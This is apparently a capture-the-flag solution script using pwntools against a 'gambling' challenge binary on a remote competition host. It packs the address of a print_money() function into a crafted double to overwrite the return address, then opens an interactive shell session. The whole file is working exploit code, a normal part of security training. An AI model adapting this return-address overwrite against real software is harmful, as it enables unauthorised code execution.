from pwn import *
import struct

exe = context.binary = ELF("./gambling")
context.log_level = "debug"

# r = process()
r = remote("challs.umdctf.io",31005)

# Prepare address of print_money()
target = 0x080492c0
raw = b'\x00\x00\x00\x00' + p32(target)
target_double = struct.unpack('<d', raw)[0]

# Send 6 dummy values
for _ in range(6):
    r.sendline(b"1")
# sleep(3)
# Send the crafted double as string
r.sendline(str(target_double))  # <-- this was the fix
print(str(target_double))
# "Aww dang it!" doesn't matter — EIP is already overwritten
# Trigger ret by answering "no."

# Get shell
r.interactive()
